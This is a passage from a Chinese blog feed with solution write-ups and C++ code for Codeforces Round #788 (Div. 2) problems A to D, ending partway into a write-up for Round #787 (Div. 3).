    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1670">Codeforces Round #788 (Div. 2)</a>题解。</p><p>实况在<a href="https://www.bilibili.com/video/BV1X3411P7jR?spm_id_from=333.999.0.0">这里</a></p><span id="more"></span><h2 id="A-Prof-Slim"><a href="#A-Prof-Slim" class="headerlink" title="A. Prof. Slim"></a>A. Prof. Slim</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你一个序列，一次操作会使序列中的两个数交换符号但不交换大小，问能否在若干次操作后使得序列不递减。容易得到负数的个数一定不变并且负数永远小于正数，因此最后的结果一定是负数全在前面，正数全在后面，因为一个位置的数的绝对值一定不会改变，所以可以得到在绝对值中，负数区域一定不递增，正数区域一定不递减。先 <code>O(n)</code> 统计所有的负数的个数，再判断就ok了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn]; </span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> num_de=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            num_de++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=num_de;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])-<span class="built_in">abs</span>(a[i<span class="number">-1</span>])&gt;<span class="number">0</span>)NO</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=num_de+<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])-<span class="built_in">abs</span>(a[i<span class="number">-1</span>])&lt;<span class="number">0</span>)NO</span><br><span class="line">    &#125;</span><br><span class="line">    OK</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Dorms-War"><a href="#B-Dorms-War" class="headerlink" title="B. Dorms War"></a>B. Dorms War</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题目题意分析了很久，后面看了很久才看出来。就是说给你一个字符串和若干个特殊字符，每次操作会使得特殊字符前面的那个字符消失，直到字符不会再消失为止，问你一共消失几次，特殊字符可以被前面的特殊字符消除。</p><p>其实不难发现，一个特殊字符吞前面字符的次数就相当于它距离最近的一个特殊字符的距离+1。多个特殊字符不影响结果，取最大即可，明明是 <code>O(n)</code> 的算法，写的时间却很高，甚至因此 <code>T</code> 了一次。以后一定要记得 <code>IO</code> 优化，拒绝 <code>cin</code>，从我做起。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn]; </span><br><span class="line"><span class="keyword">int</span> spec[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="built_in">memset</span>(spec,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(spec));</span><br><span class="line">    string tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line">        cin&gt;&gt;tmp;</span><br><span class="line">        spec[tmp[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(spec[s[i]-<span class="string">&#x27;a&#x27;</span>])&#123;</span><br><span class="line">            ans=<span class="built_in">max</span>(ans,cnt);</span><br><span class="line">            cnt=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Where-is-the-Pizza"><a href="#C-Where-is-the-Pizza" class="headerlink" title="C. Where is the Pizza?"></a>C. Where is the Pizza?</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>选择其中一个数导致了另一个必然不选，所以这里又要选另一个必选的数，然后对于每个环只有两种方案，找到环个数相乘a和b用散列保存位置。b数组全部指向a。a数组指向 自己那个值在 b 中的位置。每次判断 这个环中的位置对应的 c是否全为0。最后特判两个相等的时候这个情况也不 乘2。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],a_[maxn],b_[maxn],c[maxn],vis[maxn]; </span><br><span class="line"><span class="keyword">int</span> spec[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(pos);</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> x=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(!vis[x])&#123;</span><br><span class="line">            vis[x]=<span class="number">1</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(b_[a[x]]);</span><br><span class="line">            q.<span class="built_in">push</span>(a_[b[x]]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(c[x])&#123;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[x]==b[x])&#123;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        a_[a[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;b[i];</span><br><span class="line">        b_[b[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;c[i];    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">            <span class="keyword">int</span> res=<span class="built_in">dfs</span>(i);</span><br><span class="line">            <span class="keyword">if</span>(res)&#123;</span><br><span class="line">                ans*=<span class="number">2</span>;</span><br><span class="line">                ans%=mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Very-Suspicious"><a href="#D-Very-Suspicious" class="headerlink" title="D. Very Suspicious"></a>D. Very Suspicious</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>计算几何，自己画一下会发现：三线相交得到6个，两线相交得到2个，线只有三种方向。每添加一条线凑成三线相交，方案数+4，与其它不平行的线相交，每多一个方案数+2。然后打一遍表，把 <code>1e9</code> 以内的答案跑出来最后二分寻找答案即可。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],a_[maxn],b_[maxn],c[maxn],vis[maxn]; </span><br><span class="line"><span class="keyword">int</span> ans[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> d=<span class="built_in">lower_bound</span>(ans,ans+maxn,n)-ans;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,d);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">3</span>]=&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(ans,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(ans));</span><br><span class="line">    ans[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    ans[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    ans[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">    ans[<span class="number">3</span>]=<span class="number">6</span>;</span><br><span class="line">    ans[<span class="number">4</span>]=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span>(;cnt&lt;=<span class="number">1e9</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> sel=i%<span class="number">3</span>;</span><br><span class="line">        cnt+=(num[(sel+<span class="number">1</span>)%<span class="number">3</span>]+num[(sel+<span class="number">2</span>)%<span class="number">3</span>]<span class="number">-2</span>)*<span class="number">2</span>;</span><br><span class="line">        cnt+=<span class="number">4</span>;</span><br><span class="line">        num[sel]++;</span><br><span class="line">        ans[i+<span class="number">1</span>]=cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这波也是上大分，上了38分，希望再接再厉，争取快点上紫。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/contest/1670&quot;&gt;Codeforces Round #788 (Div. 2)&lt;/a&gt;题解。&lt;/p&gt;
&lt;p&gt;实况在&lt;a href=&quot;https://www.bilibili.com/video/BV1X3411P7jR?spm_id_from=333.999.0.0&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>Codeforces Round 787(Div.3)题解</title>
    <link href="http://example.com/2022/05/06/Codeforces%20Round%20787(Div.3)/"/>
    <id>http://example.com/2022/05/06/Codeforces%20Round%20787(Div.3)/</id>
    <published>2022-05-06T08:00:00.000Z</published>
    <updated>2022-05-07T10:26:30.592Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1675">Codeforces Round #787 (Div. 3)</a> 题解来了。</p><p>实况在<a href="https://www.bilibili.com/video/bv1eF411j7Uz">这里</a></p><span id="more"></span><h2 id="A-Food-for-Animals"><a href="#A-Food-for-Animals" class="headerlink" title="A. Food for Animals"></a>A. Food for Animals</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你猫粮，狗粮和猫和狗都能吃的粮的个数，再给你猫狗的个数，问能否使得猫狗都有一份粮食能吃。这里我操之过急，导致WA了一发，血亏。就是说你可以先判断狗粮是否够，如果不够则通用粮食减去剩余的数目，然后在判断通用粮食和猫粮是否大于等于猫的个数就行了，但是非常要注意，通用粮食的个数不能出现负数，因为这里没判断wa了一发，很难。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">5</span>];</span><br><span class="line">    cin&gt;&gt;num[<span class="number">1</span>]&gt;&gt;num[<span class="number">2</span>]&gt;&gt;num[<span class="number">3</span>]&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    num[<span class="number">3</span>]-=<span class="built_in">max</span>(<span class="number">0</span>,x-num[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(num[<span class="number">3</span>]&lt;<span class="number">0</span>)<span class="function">NO</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    <span class="title">if</span><span 